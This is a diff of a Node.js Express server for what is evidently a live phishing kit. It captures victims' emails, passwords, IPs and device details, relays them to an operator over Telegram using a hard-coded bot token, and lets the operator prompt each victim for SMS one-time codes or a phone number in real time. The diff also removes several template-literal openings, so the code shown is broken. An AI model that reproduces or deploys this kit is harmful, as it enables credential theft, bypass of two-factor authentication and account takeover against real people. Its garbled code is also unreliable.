@@ -4,45 +4,36 @@ const TelegramBot = require('node-telegram-bot-api');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
 
-// ─── CONFIG ───────────────────────────────────────────────────────────────────
+
 const BOT_TOKEN   = process.env.BOT_TOKEN   || '8748301916:AAHC09wVDPVG-xLObOvD-k_pAFiu8TnkwAw';
 const ADMIN_CHAT  = process.env.ADMIN_CHAT  || '8745609962';
 const PORT        = process.env.PORT        || 3000;
 
-// ─── APP SETUP ────────────────────────────────────────────────────────────────
+
 const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Serve frontend from same origin (place index.html in ../frontend or ./public)
+
 app.use(express.static(path.join(__dirname, '..', 'frontend')));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ─── IN-MEMORY SESSION STORE ──────────────────────────────────────────────────
-// { [sessionId]: { email, password, name, ip, device, ua, type, status, messageId, createdAt } }
+
 const sessions = {};
 
-// Allowed statuses:
-//   'pending'         – waiting for admin action
-//   'approved'        – admin clicked ✅ Yes Prompt
-//   'denied'          – admin clicked ❌ Password Error
-//   'blocked'         – admin clicked 🚫 Block Visitor
-//   'sms_required'    – admin clicked 📱 SMS Code I
-//   'sms2_required'   – admin clicked 📱 SMS Code II
-//   'number_required' – admin clicked 📞 Number Prompt
 
-// ─── TELEGRAM BOT ─────────────────────────────────────────────────────────────
+
+
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 bot.on('polling_error', err => console.error('[TG Poll Error]', err.message));
 
-// Helper: send a visit notification to admin with inline keyboard
+
 async function sendVisitNotification(session) {
   const { sessionId, email, password, name, ip, device, ua, type } = session;
 
   const text =
-`🔐 *NEW VISIT* 🔐
-━━━━━━━━━━━━━━━━━━
+
 📧 *Email:* \`${email}\`
 🔑 *Password:* \`${password}\`
 ${name ? `👤 *Name:* \`${name}\`\n` : ''}🌐 *IP:* \`${ip}\`
@@ -80,7 +71,7 @@ ${name ? `👤 *Name:* \`${name}\`\n` : ''}🌐 *IP:* \`${ip}\`
   }
 }
 
-// Handle admin button presses
+
 bot.on('callback_query', async (query) => {
   const [sessionId, action] = (query.data || '').split('::');
   const session = sessions[sessionId];
@@ -90,10 +81,10 @@ bot.on('callback_query', async (query) => {
     return;
   }
 
-  // Update session status
+  
   session.status = action;
 
-  // Build confirmation message
+
   const statusLabels = {
     approved:        '✅ Approved — access granted',
     denied:          '❌ Denied — password error shown',
@@ -105,7 +96,7 @@ bot.on('callback_query', async (query) => {
 
   const label = statusLabels[action] || action;
 
-  // Edit the original message to show the action taken
+  
   try {
     await bot.editMessageText(
       `${query.message.text}\n\n👮 *Action taken:* ${label}`,
@@ -126,7 +117,7 @@ bot.on('callback_query', async (query) => {
 // When visitor submits SMS code — notify admin
 async function notifySMSCode(session, code, codeType) {
   const text =
-`📟 *SMS CODE RECEIVED*
+
 ━━━━━━━━━━━━━
 📧 *Email:* \`${session.email}\`
 🔢 *Code:* \`${code}\`
@@ -145,10 +136,10 @@ async function notifySMSCode(session, code, codeType) {
   session.status = 'pending'; // wait for admin decision again
 }
 
-// When visitor submits phone — notify admin
+
 async function notifyPhone(session, phone) {
   const text =
-`📞 *PHONE NUMBER RECEIVED*
+
 ━━━━━━━━━━━━━
 📧 *Email:* \`${session.email}\`
 📱 *Phone:* \`${phone}\`
@@ -166,9 +157,9 @@ async function notifyPhone(session, phone) {
   session.status = 'pending';
 }
 
-// ─── API ROUTES ───────────────────────────────────────────────────────────────
 
-// POST /api/login — visitor submits credentials
+
+
 app.post('/api/login', async (req, res) => {
   const { email, password, name, ip, device, ua, type } = req.body;
 
@@ -192,7 +183,7 @@ app.post('/api/login', async (req, res) => {
 
   sessions[sessionId] = session;
 
-  // Send Telegram notification
+  
   const messageId = await sendVisitNotification(session);
   session.messageId = messageId;
 
@@ -200,7 +191,7 @@ app.post('/api/login', async (req, res) => {
   res.json({ sessionId, status: 'pending' });
 });
 
-// GET /api/session/:id/status — frontend polls this
+
 app.get('/api/session/:id/status', (req, res) => {
   const session = sessions[req.params.id];
   if (!session) return res.status(404).json({ status: 'expired' });
@@ -214,7 +205,7 @@ app.get('/api/session/:id/status', (req, res) => {
   res.json({ status: session.status });
 });
 
-// POST /api/session/:id/sms — visitor submits SMS code
+
 app.post('/api/session/:id/sms', async (req, res) => {
   const session = sessions[req.params.id];
   if (!session) return res.status(404).json({ error: 'Session not found' });
@@ -227,7 +218,7 @@ app.post('/api/session/:id/sms', async (req, res) => {
   res.json({ ok: true });
 });
 
-// POST /api/session/:id/phone — visitor submits phone number
+
 app.post('/api/session/:id/phone', async (req, res) => {
   const session = sessions[req.params.id];
   if (!session) return res.status(404).json({ error: 'Session not found' });
@@ -238,7 +229,7 @@ app.post('/api/session/:id/phone', async (req, res) => {
   res.json({ ok: true });
 });
 
-// Fallback — serve frontend
+
 app.get('*', (req, res) => {
   const frontendPath = path.join(__dirname, '..', 'frontend', 'index.html');
   res.sendFile(frontendPath, err => {
@@ -246,7 +237,7 @@ app.get('*', (req, res) => {
   });
 });
 
-// ─── START ────────────────────────────────────────────────────────────────────
+
 app.listen(PORT, () => {
   console.log(`
   ╔═══════════════════════════════════════╗
